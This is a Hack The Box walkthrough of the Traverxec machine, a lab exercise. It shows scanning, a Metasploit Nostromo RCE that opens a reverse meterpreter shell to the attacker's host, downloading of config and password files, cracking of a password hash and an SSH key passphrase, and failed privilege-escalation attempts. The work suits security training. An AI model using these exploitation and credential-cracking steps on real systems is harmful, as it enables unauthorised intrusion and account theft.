# [Grav3m1ndbyte's Resources Blog](/index.html) > [Hack The Box Machine Walkthroughs](/HTB-Machines.html)


![Grav3m1ndbyte HTB Badge](https://www.hackthebox.eu/badge/image/75471)





# Traverxec

![Traverxec Infocard](/images/Traverxec.png)

## Overview

  Traverxec box was one of the first HTB boxes I rooted and good one. To get this walkthrough completed, I basically had to redo the entire box as at this point, I wasn't even considering documenting my approaches or not doing them well. A faliures on my part for relying solely on my memory.
  
  Anyway, this box is sort of the typical Linux box, but gets interesting once you gain access. Below, I included some links resources which were part of my research.


### Resources:

  1. [Nostromo webserver-nhttpd.conf ManPage](https://www.gsp.com/cgi-bin/man.cgi?section=8&topic=nhttpd)

  2. [Nostromo 1.9.6 Directory Traversal RCE](https://www.exploit-db.com/exploits/47573)

  3. [PTRACE_TRACEME - CVE-2019-13272](https://www.exploit-db.com/exploits/47543)

  4. [Sudo 1.8.25p - 'pwfeedback' Buffer Overflow](https://www.exploit-db.com/exploits/48052)

  5. [GTFOBins - journalctl](https://gtfobins.github.io/gtfobins/journalctl/)



## Initial Enumeration: Footprinting and Scanning

First of, we need to identify how to reach the system. In other words, we need to identify what are the services available from this machine.

Let's start by adding this machine's IP address to the hosts file and create an alias:

```
kali@back0ff:~/Documents/HTB-Labs/Traverxec$ sudo echo "10.10.10.165  traverxec.htb" >> /etc/hosts
```

In this box, I solely used *nmap* for discover the open ports and then enumerate further. The initial approach is basically the same I'd used before with masscan.

### NMAP

To discover the open ports I used the following:

```
-e -> designating the interface to use when communitcating to the HTB machine, 
	I am using the HTB VPN interface
-p -> to designate the port range to target: 
	1-65535,U:1-65535 -> to target all TCP and UDP ports
--rate -> transmission rate of packets per second
-T4 -> designating the aggreessive timing template (something you only use in certain scenarios)
```

Then, to further enumerate the services found and get more information from each one using *nmap*, I used the following:

```
-sC -> to use all default non-intrusive nmap scripts on each service 

-sV -> to get the service version information which is definitely important for us

-p -> to designate the port we will be targeting 

-vvvv -> for extended verbosity (as I like as many details as I can get)
```

#### Let's begin:

```
kali@back0ff:~/Documents/HTB-Labs/Traverxec$ nmap -e tun1 -p1-65535,U:1-65535 --min-rate=1000 -T4 traverxec.htb -oN Traverxec_open.log -oX Traverxec_open.xml
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-09 09:39 EDT
Nmap scan report for traverxec.htb (10.10.10.165)
Host is up (0.13s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 106.55 seconds
kali@back0ff:~/Documents/HTB-Labs/Traverxec$ nmap -sC -sV -p 22,80 traverxec.htb -oN Traverxec_TCP.log -oX Traverxec_TCP.xml
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-09 09:43 EDT
Nmap scan report for traverxec.htb (10.10.10.165)
Host is up (0.19s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.70 seconds
```

After finding SSH and HTTP open, my first thought was to take a look at HTTP on the browser and enumerate pages/directories. Through the browser, there wasn't much to see initially, and the most weird thing was getting connection refused errors with *gobuster* and even *dirb* did not finish well.

![Traverxec-page](/images/Traverxec-page.png)


### GOBUSTER and DIRB
```
kali@back0ff:~/Documents/HTB-Labs/Traverxec$ gobuster dir -u http://traverxec.htb -w /usr/share/wordlists/dirb/common.txt -r -t 50 --timeout 20s --wildcard
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://traverxec.htb
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Follow Redir:   true
[+] Timeout:        20s
===============================================================
2020/04/09 09:54:31 Starting gobuster
===============================================================
[ERROR] 2020/04/09 09:54:32 [!] Get http://traverxec.htb/_code: dial tcp 10.10.10.165:80: connect: connection refused
[ERROR] 2020/04/09 09:54:32 [!] Get http://traverxec.htb/_archive: dial tcp 10.10.10.165:80: connect: connection refused
[ERROR] 2020/04/09 09:54:32 [!] Get http://traverxec.htb/_assets: dial tcp 10.10.10.165:80: connect: connection refused
[ERROR] 2020/04/09 09:54:32 [!] Get http://traverxec.htb/_catalogs: dial tcp 10.10.10.165:80: connect: connection refused
[ERROR] 2020/04/09 09:54:32 [!] Get http://traverxec.htb/_: dial tcp 10.10.10.165:80: connect: connection refused
[ERROR] 2020/04/09 09:54:32 [!] Get http://traverxec.htb/_cache: dial tcp 10.10.10.165:80: connect: connection refused[ERROR] 2020/04/09 09:54:33 [!] Get http://traverxec.htb/_common: dial tcp 10.10.10.165:80: connect: connection refused
^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2020/04/09 09:54:34 Finished
===============================================================

kali@back0ff:~/Documents/HTB-Labs/Traverxec$ dirb http://traverxec.htb/ /usr/share/wordlists/dirb/common.txt

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu Apr  9 09:55:43 2020
URL_BASE: http://traverxec.htb/
WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://traverxec.htb/ ----
==> DIRECTORY: http://traverxec.htb/css/                                         
==> DIRECTORY: http://traverxec.htb/icons/                                       
==> DIRECTORY: http://traverxec.htb/img/                                         
+ http://traverxec.htb/index.html (CODE:200|SIZE:15674)                          
==> DIRECTORY: http://traverxec.htb/js/                                          
==> DIRECTORY: http://traverxec.htb/lib/                                         
                                                                                 
---- Entering directory: http://traverxec.htb/css/ ----
                                                                                 
---- Entering directory: http://traverxec.htb/icons/ ----
                                                                                 
(!) FATAL: Too many errors connecting to host
    (Possible cause: OPERATION TIMEOUT)
                                                                               
-----------------
END_TIME: Thu Apr  9 11:14:31 2020
DOWNLOADED: 11355 - FOUND: 1

```

## Exploitation and Gaining Access

Seeing all this, made me realize I overlooked the fact that *nmap* pulled information from the webserver that is running on Traverxec. The web server being *Nostromo* version 1.9.6, which among other things could be setup to publish directories in users' home directories. This web server has a known exploit and a Metasploit module that performs a Directory Traversal RCE.

### METASPLOIT

```
kali@back0ff:~/Documents/HTB-Labs/Traverxec$ msfconsole
                                                  

Unable to handle kernel NULL pointer dereference at virtual address 0xd34db33f
EFLAGS: 00010046
eax: 00000001 ebx: f77c8c00 ecx: 00000000 edx: f77f0001
esi: 803bf014 edi: 8023c755 ebp: 80237f84 esp: 80237f60
ds: 0018   es: 0018  ss: 0018
Process Swapper (Pid: 0, process nr: 0, stackpage=80377000)


Stack: 90909090990909090990909090
       90909090990909090990909090
       90909090.90909090.90909090
       90909090.90909090.90909090
       90909090.90909090.09090900
       90909090.90909090.09090900
       ..........................
       cccccccccccccccccccccccccc
       cccccccccccccccccccccccccc
       ccccccccc.................
       cccccccccccccccccccccccccc
       cccccccccccccccccccccccccc
       .................ccccccccc
       cccccccccccccccccccccccccc
       cccccccccccccccccccccccccc
       ..........................
       ffffffffffffffffffffffffff
       ffffffff..................
       ffffffffffffffffffffffffff
       ffffffff..................
       ffffffff..................
       ffffffff..................


Code: 00 00 00 00 M3 T4 SP L0 1T FR 4M 3W OR K! V3 R5 I0 N5 00 00 00 00
Aiee, Killing Interrupt handler
Kernel panic: Attempted to kill the idle task!
In swapper task - not syncing


       =[ metasploit v5.0.83-dev                          ]
+ -- --=[ 1996 exploits - 1090 auxiliary - 340 post       ]
+ -- --=[ 564 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: View advanced module options with advanced

[*] Starting persistent handler(s)...
msf5 > search nostromo

Matching Modules
================

   #  Name                                   Disclosure Date  Rank  Check  Description
   -  ----                                   ---------------  ----  -----  -----------
   0  exploit/multi/http/nostromo_code_exec  2019-10-20       good  Yes    Nostromo Directory Traversal Remote Command Execution


msf5 > use exploit/multi/http/nostromo_code_exec
msf5 exploit(multi/http/nostromo_code_exec) > show options

Module options (exploit/multi/http/nostromo_code_exec):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    80               yes       The target port (TCP)
   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT  8080             yes       The local port to listen on.
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                   no        The URI to use for this exploit (default is random)
   VHOST                     no        HTTP server virtual host


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic (Unix In-Memory)


msf5 exploit(multi/http/nostromo_code_exec) > set LHOST 10.10.14.28
LHOST => 10.10.14.28
msf5 exploit(multi/http/nostromo_code_exec) > set RHOSTS 10.10.10.165
RHOSTS => 10.10.10.165
msf5 exploit(multi/http/nostromo_code_exec) > set RHOST 10.10.10.165
RHOST => 10.10.10.165
msf5 exploit(multi/http/nostromo_code_exec) > set TARGET 1
TARGET => 1
msf5 exploit(multi/http/nostromo_code_exec) > exploit

[*] Started reverse TCP handler on 10.10.14.28:4444 
[*] Configuring Automatic (Linux Dropper) target
[*] Sending linux/x64/meterpreter/reverse_tcp command stager
[*] Sending stage (3012516 bytes) to 10.10.10.165
[*] Meterpreter session 1 opened (10.10.14.28:4444 -> 10.10.10.165:43890) at 2020-04-09 13:13:43 -0400
[*] Command Stager progress - 100.00% done (823/823 bytes)

meterpreter > sysinfo
Computer     : traverxec.htb
OS           : Debian 10.1 (Linux 4.19.0-6-amd64)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > shell
Process 826 created.
Channel 1 created.
bash
python -c 'import pty;pty.spawn("/bin/bash")'
www-data@traverxec:/usr/bin$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@traverxec:/usr/bin$ cd /var
cd /var
www-data@traverxec:/var$ ls
ls
backups  cache	lib  local  lock  log  mail  nostromo  opt  run  spool	tmp
www-data@traverxec:/var$ ls -ltr backups/
ls -ltr backups/
total 380
-rw-r--r-- 1 root root      100 Oct 25 14:20 dpkg.statoverride.0
-rw-r--r-- 1 root root      186 Oct 25 14:34 dpkg.diversions.0
-rw------- 1 root root      708 Oct 25 14:34 group.bak
-rw------- 1 root shadow    597 Oct 25 14:34 gshadow.bak
-rw------- 1 root root     1395 Oct 25 14:34 passwd.bak
-rw-r--r-- 1 root root     7665 Oct 25 15:30 apt.extended_states.0
-rw-r--r-- 1 root root   314222 Oct 25 15:30 dpkg.status.0
-rw------- 1 root shadow    940 Oct 27 04:56 shadow.bak
-rw-r--r-- 1 root root    40960 Nov 12 06:25 alternatives.tar.0


www-data@traverxec:/var$ exit
exit
exit
exit
meterpreter > download /var/nostromo/conf/nhttpd.conf
[*] Downloading: /var/nostromo/conf/nhttpd.conf -> nhttpd.conf
[*] Downloaded 498.00 B of 498.00 B (100.0%): /var/nostromo/conf/nhttpd.conf -> nhttpd.conf
[*] download   : /var/nostromo/conf/nhttpd.conf -> nhttpd.conf
meterpreter > download /var/nostromo/conf/.htpasswd
[*] Downloading: /var/nostromo/conf/.htpasswd -> .htpasswd
[*] Downloaded 41.00 B of 41.00 B (100.0%): /var/nostromo/conf/.htpasswd -> .htpasswd
[*] download   : /var/nostromo/conf/.htpasswd -> .htpasswd
meterpreter > bg
[*] Backgrounding session 1...
msf5 exploit(multi/http/nostromo_code_exec) > 
```

So not only I gained access with no issues, but relied on the information found from Nostromo to grab two important files: *nhttpd.conf* and *.htpasswd*. Once I found the path where *Nostromo*, */var/Nostromo*, I went straight to download the files.

On a different terminal window, I inspected the both files and found a few interesting things, including a hash and the Nostromo configuration. This hash lead me nowhere; I attempted to use them through SSH but it didn't work as possibly public/private key authentication is enabled. 

### JOHN THE RIPPER

On Terminal Window #2:

```
kali@back0ff:~/Documents/HTB-Labs/Traverxec$ cat .htpasswd 
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
kali@back0ff:~/Documents/HTB-Labs/Traverxec$ john --wordlist=/usr/share/wordlists/rockyou.txt .htpasswd > david_creds.txt
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
1g 0:00:01:08 DONE (2020-04-09 13:45) 0.01467g/s 155222p/s 155222c/s 155222C/s Noyoudo..Nous4=5
Use the "--show" option to display all of the cracked passwords reliably
Session completed
kali@back0ff:~/Documents/HTB-Labs/Traverxec$ cat david_creds.txt 
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Nowonly4me       (david)
```

Through the *.htpasswd*, not only I found the user *david* and a hash that belongs to him, but I was also able to crack it; **Nowonly4me**.


Below, we have the nhttpd.conf file. From what I read, the interesting items here are the *serveradmin*, the *Basic Authentication* section, and the *HOMEDIRS* section. Between the *serveradmin* and *HOMEDIRS*, and also from what I read, I could assume there might be a directory inside of david's home directory.

```
kali@back0ff:~/Documents/HTB-Labs/Traverxec$ cat nhttpd.conf 
# MAIN [MANDATORY]

servername		traverxec.htb
serverlisten		*
serveradmin		david@traverxec.htb
serverroot		/var/nostromo
servermimes		conf/mimes
docroot			/var/nostromo/htdocs
docindex		index.html

# LOGS [OPTIONAL]

logpid			logs/nhttpd.pid

# SETUID [RECOMMENDED]

user			www-data

# BASIC AUTHENTICATION [OPTIONAL]

htaccess		.htaccess
htpasswd		/var/nostromo/conf/.htpasswd

# ALIASES [OPTIONAL]

/icons			/var/nostromo/icons

# HOMEDIRS [OPTIONAL]

homedirs		/home
homedirs_public		public_www
kali@back0ff:~/Documents/HTB-Labs/Traverxec$ 
```

As previously mentioned, Nostromo basically uses the designated public directory from the user's home directory to make it publicly accessible; of course if that is configured. So one way I thought of testing this assumption was to access whatever is accessible from david.

To do this, based on Nostromo documentation, it would have to be attempted as:

*http://traverxec.htb/~david*

![Traverxec-page-user](Traverxec-page-user.png)

As you can see we accessed something (not too revealing though) that confirms this. Let's go back to Metasploit's shell session and keep enumerating and find a way to switch to david's user.

On Terminal Window #1 (Metasploit Shell):

```
msf5 exploit(multi/http/nostromo_code_exec) > sessions 1
meterpreter > shell
Process 1140 created.
Channel 1 created.
python -c 'import pty;pty.spawn("/bin/bash")'
www-data@traverxec:/usr/bin$ cd /home/david/public_www
cd /home/david/public_www
www-data@traverxec:/home/david/public_www$ ls -al
ls -al
total 16
drwxr-xr-x 3 david david 4096 Oct 25 15:45 .
drwx--x--x 5 david david 4096 Oct 25 17:02 ..
-rw-r--r-- 1 david david  402 Oct 25 15:45 index.html
drwxr-xr-x 2 david david 4096 Oct 25 17:02 protected-file-area
www-data@traverxec:/home/david/public_www$ cd protected-file-area
cd protected-file-area
www-data@traverxec:/home/david/public_www/protected-file-area$ ls -al
ls -al
total 16
drwxr-xr-x 2 david david 4096 Oct 25 17:02 .
drwxr-xr-x 3 david david 4096 Oct 25 15:45 ..
-rw-r--r-- 1 david david   45 Oct 25 15:46 .htaccess
-rw-r--r-- 1 david david 1915 Oct 25 17:02 backup-ssh-identity-files.tgz
www-data@traverxec:/home/david/public_www/protected-file-area$ 
```

As you can see, not only we found *public_www* from *nhttpd.conf* exists within david's home directory, but we also found the listed *.htaccess* file from the *Basic Authentication* section and a TGZ file. We don't know the content of it, but it could have important files.

Let's see try and retrieve and then access both.

```
www-data@traverxec:/home/david/public_www/protected-file-area$ exit
exit
exit
exit
meterpreter > download /home/david/public_www/protected-file-area/.htaccess
[*] Downloading: /home/david/public_www/protected-file-area/.htaccess -> .htaccess
[*] Downloaded 45.00 B of 45.00 B (100.0%): /home/david/public_www/protected-file-area/.htaccess -> .htaccess
[*] download   : /home/david/public_www/protected-file-area/.htaccess -> .htaccess
meterpreter > download /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz
[*] Downloading: /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz -> backup-ssh-identity-files.tgz
[*] Downloaded 1.87 KiB of 1.87 KiB (100.0%): /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz -> backup-ssh-identity-files.tgz
[*] download   : /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz -> backup-ssh-identity-files.tgz
meterpreter > 
```
Back to Terminal Window #2:

```
kali@back0ff:~/Documents/HTB-Labs/Traverxec$ cat .htaccess 
realm David's Protected File Area. Keep out!
kali@back0ff:~/Documents/HTB-Labs/Traverxec$ tar -xzvf backup-ssh-identity-files.tgz 
home/david/.ssh/
home/david/.ssh/authorized_keys
home/david/.ssh/id_rsa
home/david/.ssh/id_rsa.pub
```

And we got david's *.ssh* directory with its private/public key pairs. Let's try to convert david's private key into JohnTheRipper format and crack it.

```
kali@back0ff:~/Documents/HTB-Labs/Traverxec$ ssh2john home/david/.ssh/id_rsa | tee david_hash.txt
home/david/.ssh/id_rsa:$sshng$1$16$477EEFFBA56F9D283D349033D5D08C4F$1200$b1ec9e1ff7de1b5f5395468c76f1d92bfdaa7f2f29c3076bf6c83be71e213e9249f186ae856a2b08de0b3c957ec1f086b6e8813df672f993e494b90e9de220828aee2e45465b8938eb9d69c1e9199e3b13f0830cde39dd2cd491923c424d7dd62b35bd5453ee8d24199c733d261a3a27c3bc2d3ce5face868cfa45c63a3602bda73f08e87dd41e8cf05e3bb917c0315444952972c02da4701b5da248f4b1725fc22143c7eb4ce38bb81326b92130873f4a563c369222c12f2292fac513f7f57b1c75475b8ed8fc454582b1172aed0e3fcac5b5850b43eee4ee77dbedf1c880a27fe906197baf6bd005c43adbf8e3321c63538c1abc90a79095ced7021cbc92ffd1ac441d1dd13b65a98d8b5e4fb59ee60fcb26498729e013b6cff63b29fa179c75346a56a4e73fbcc8f06c8a4d5f8a3600349bb51640d4be260aaf490f580e3648c05940f23c493fd1ecb965974f464dea999865cfeb36408497697fa096da241de33ffd465b3a3fab925703a8e3cab77dc590cde5b5f613683375c08f779a8ec70ce76ba8ecda431d0b121135512b9ef486048052d2cfce9d7a479c94e332b92a82b3d609e2c07f4c443d3824b6a8b543620c26a856f4b914b38f2cfb3ef6780865f276847e09fe7db426e4c319ff1e810aec52356005aa7ba3e1100b8dd9fa8b6ee07ac464c719d2319e439905ccaeb201bae2c9ea01e08ebb9a0a9761e47b841c47d416a9db2686c903735ebf9e137f3780b51f2b5491e50aea398e6bba862b6a1ac8f21c527f852158b5b3b90a6651d21316975cd543709b3618de2301406f3812cf325d2986c60fdb727cadf3dd17245618150e010c1510791ea0bec870f245bf94e646b72dc9604f5acefb6b28b838ba7d7caf0015fe7b8138970259a01b4793f36a32f0d379bf6d74d3a455b4dd15cda45adcfdf1517dca837cdaef08024fca3a7a7b9731e7474eddbdd0fad51cc7926dfbaef4d8ad47b1687278e7c7474f7eab7d4c5a7def35bfa97a44cf2cf4206b129f8b28003626b2b93f6d01aea16e3df597bc5b5138b61ea46f5e1cd15e378b8cb2e4ffe7995b7e7e52e35fd4ac6c34b716089d599e2d1d1124edfb6f7fe169222bc9c6a4f0b6731523d436ec2a15c6f147c40916aa8bc6168ccedb9ae263aaac078614f3fc0d2818dd30a5a113341e2fcccc73d421cb711d5d916d83bfe930c77f3f99dba9ed5cfcee020454ffc1b3830e7a1321c369380db6a61a757aee609d62343c80ac402ef8abd56616256238522c57e8db245d3ae1819bd01724f35e6b1c340d7f14c066c0432534938f5e3c115e120421f4d11c61e802a0796e6aaa5a7f1631d9ce4ca58d67460f3e5c1cdb2c5f6970cc598805abb386d652a0287577c453a159bfb76c6ad4daf65c07d386a3ff9ab111b26ec2e02e5b92e184e44066f6c7b88c42ce77aaa918d2e2d3519b4905f6e2395a47cad5e2cc3b7817b557df3babc30f799c4cd2f5a50b9f48fd06aaf435762062c4f331f989228a6460814c1c1a777795104143630dc16b79f51ae2dd9e008b4a5f6f52bb4ef38c8f5690e1b426557f2e068a9b3ef5b4fe842391b0af7d1e17bfa43e71b6bf16718d67184747c8dc1fcd1568d4b8ebdb6d55e62788553f4c69d128360b407db1d278b5b417f4c0a38b11163409b18372abb34685a30264cdfcf57655b10a283ff0
kali@back0ff:~/Documents/HTB-Labs/Traverxec$ john --wordlist=/usr/share/wordlists/rockyou.txt david_hash.txt | tee david_passphrase.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Will run 4 OpenMP threads
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
hunter           (home/david/.ssh/id_rsa)
Warning: Only 2 candidates left, minimum 4 needed for performance.
1g 0:00:00:04 DONE (2020-04-09 22:07) 0.2331g/s 3343Kp/s 3343Kc/s 3343KC/sa6_123..*7¡Vamos!
Session completed
kali@back0ff:~/Documents/HTB-Labs/Traverxec$
```

As we found the passphrase for david's private key, **hunter**, we can now attempt to SSH as david with the private key.

Back on Terminal Window #1:

```
meterpreter > 
[*] 10.10.10.165 - Meterpreter session 2 closed.  Reason: Died

msf5 exploit(multi/http/nostromo_code_exec) > exit
kali@back0ff:~/Documents/HTB-Labs/Traverxec$ ssh -i home/david/.ssh/id_rsa david@traverxec.htb
Enter passphrase for key 'home/david/.ssh/id_rsa': 
Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
david@traverxec:~$ id
uid=1000(david) gid=1000(david) groups=1000(david),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
david@traverxec:~$ pwd
/home/david
david@traverxec:~$ ls -a
.  ..  .bash_history  .bash_logout  .bashrc  bin  .profile  public_www  .ssh  user.txt
david@traverxec:~$ cat user.txt 
7db0b**********************82f3d
```

**AND we got user!** Let's keep going.


## Privilege Escalation

Now that I accessed the system with a different account that has more access than *www-data*,  my first thought was trying to find out if I could escalate privileges through a vulnerability.

The spoiler here will be (on purpose) that I was not successful when going through this path, and most probably was my own fault, BUT I will still show it as it is an important step regardless.

### LINUX-EXPLOIT-SUGGESTER.SH

```
david@traverxec:~$ cd /tmp/
david@traverxec:/tmp$ vi linenum.sh #linux-exploit-suggester.sh
david@traverxec:/tmp$ chmod +x linenum.sh 
david@traverxec:/tmp$ ./linenum.sh 

Available information:

Kernel version: 4.19.0
Architecture: x86_64
Distribution: debian
Distribution version: 10
Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed
Package listing: from current OS

Searching among:

73 kernel space exploits
44 user space exploits

Possible Exploits:
[+] [CVE-2019-13272] PTRACE_TRACEME

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1903
   Exposure: highly probable
   Tags: ubuntu=16.04{kernel:4.15.0-*},ubuntu=18.04{kernel:4.15.0-*},debian=9{kernel:4.9.0-*},[ debian=10{kernel:4.19.0-*} ],fedora=30{kernel:5.0.9-*}
   Download URL: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/47133.zip
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c
   Comments: Requires an active PolKit agent.

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.
david@traverxec:/tmp$ 
```

The first vulnerability (CVE-2019-13272 - PTRACE_TRACEME) points to a Linux Polkit - pkexec helper PTRACE_TRACEME local root exploit that exists in Metasploit as well based on what we found on Exploit-DB (see the reference). This one is the most logical to start with as the 'Exposure' is highly probable.

### METASPLOIT

```
kali@back0ff:~/Documents/HTB-Labs/Traverxec$ msfconsole
                                                  
                                   ___          ____
                               ,-""   `.      < HONK >
                             ,'  _   e )`-._ /  ----
                            /  ,' `-._<.===-'
                           /  /
                          /  ;
              _          /   ;
 (`._    _.-"" ""--..__,'    |
 <_  `-""                     \
  <`-                          :
   (__   <__.                  ;
     `-.   '-.__.      _.'    /
        \      `-.__,-'    _,'
         `._    ,    /__,-'
            ""._\__,'< <____
                 | |  `----.`.
                 | |        \ `.
                 ; |___      \-``
                 \   --<
                  `.`.<
                    `-'



       =[ metasploit v5.0.83-dev                          ]
+ -- --=[ 1996 exploits - 1090 auxiliary - 340 post       ]
+ -- --=[ 564 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: Use help <command> to learn more about any command

[*] Starting persistent handler(s)...
msf5 > search CVE-2019-13272

Matching Modules
================

   #  Name                                              Disclosure Date  Rank       Check  Description
   -  ----                                              ---------------  ----       -----  -----------
   0  exploit/linux/local/ptrace_traceme_pkexec_helper  2019-07-04       excellent  Yes    Linux Polkit pkexec helper PTRACE_TRACEME local root exploit


msf5 > use multi/http/nostromo_code_exec
msf5 exploit(multi/http/nostromo_code_exec) > set LHOST 10.10.14.28
LHOST => 10.10.14.28
msf5 exploit(multi/http/nostromo_code_exec) > set RHOSTS 10.10.10.165
RHOSTS => 10.10.10.165
msf5 exploit(multi/http/nostromo_code_exec) > set RHOST 10.10.10.165
RHOST => 10.10.10.165
msf5 exploit(multi/http/nostromo_code_exec) > set TARGET 1
TARGET => 1
msf5 exploit(multi/http/nostromo_code_exec) > exploit

[*] Started reverse TCP handler on 10.10.14.28:4444 
[*] Configuring Automatic (Linux Dropper) target
[*] Sending linux/x64/meterpreter/reverse_tcp command stager
[*] Sending stage (3012516 bytes) to 10.10.10.165
[*] Meterpreter session 1 opened (10.10.14.28:4444 -> 10.10.10.165:43898) at 2020-04-09 22:34:52 -0400
[*] Command Stager progress - 100.00% done (823/823 bytes)

meterpreter > bg
[*] Backgrounding session 1...
msf5 exploit(multi/http/nostromo_code_exec) > use exploit/linux/local/ptrace_traceme_pkexec_helper
msf5 exploit(linux/local/ptrace_traceme_pkexec_helper) > show options

Module options (exploit/linux/local/ptrace_traceme_pkexec_helper):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   COMPILE  Auto             yes       Compile on target (Accepted: Auto, True, False)
   SESSION                   yes       The session to run this module on.


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Auto


msf5 exploit(linux/local/ptrace_traceme_pkexec_helper) > set LHOST 10.10.14.28
LHOST => 10.10.14.28
msf5 exploit(linux/local/ptrace_traceme_pkexec_helper) > set LPORT 4445
LPORT => 4445
msf5 exploit(linux/local/ptrace_traceme_pkexec_helper) > set SESSION 1
SESSION => 1
msf5 exploit(linux/local/ptrace_traceme_pkexec_helper) > exploit

[*] Started reverse TCP handler on 10.10.14.28:4445 
[-] Exploit aborted due to failure: not-vulnerable: Target is not vulnerable. Set ForceExploit to override.
[*] Exploit completed, but no session was created.
msf5 exploit(linux/local/ptrace_traceme_pkexec_helper) > 
```

So that didn't work! Let's try the other one by uploading the exploit onto the box along with *socat*. This exploit relies on *socat* and tries to retrieve it if it doesn't exist there, but problem is the box will not be able to reach the internet and retrieve it (by HTB design).

```
kali@back0ff:~/Documents/HTB-Labs/Traverxec$ searchsploit pwfeedback
-------------------------------------------------------- ----------------------------------------
 Exploit Title                                          |  Path
                                                        | (/usr/share/exploitdb/)
-------------------------------------------------------- ----------------------------------------
Sudo 1.8.25p - 'pwfeedback' Buffer Overflow             | exploits/linux/local/48052.sh
Sudo 1.8.25p - 'pwfeedback' Buffer Overflow (PoC)       | exploits/linux/dos/47995.txt
-------------------------------------------------------- ----------------------------------------
Shellcodes: No Result

kali@back0ff:~/Documents/HTB-Labs/Traverxec$ scp -i home/david/.ssh/id_rsa socat david@traverxec.htb
kali@back0ff:~/Documents/HTB-Labs/Traverxec$ scp -i home/david/.ssh/id_rsa socat david@traverxec.htb:/tmp
Enter passphrase for key 'home/david/.ssh/id_rsa': 
socat                                                          100%  366KB 575.3KB/s   00:00    
kali@back0ff:~/Documents/HTB-Labs/Traverxec$ scp -i home/david/.ssh/id_rsa 48052.sh  david@traverxec.htb:/tmp
Enter passphrase for key 'home/david/.ssh/id_rsa': 
48052.sh                                                       100% 1354    11.0KB/s   00:00    
david@traverxec:/tmp$ chmod +x socat
david@traverxec:/tmp$ ./48052.sh 
./48052.sh: line 47: cc: command not found
[sudo] password for david: 
sudo: no password was provided
./48052.sh: line 52: /tmp/pipe: No such file or directory
david@traverxec:/tmp$
```
So...back to square one! As I said, at this point I'm sure I'm doing something wrong and possibly I overlooked something. Let's enumerate a little more as david.

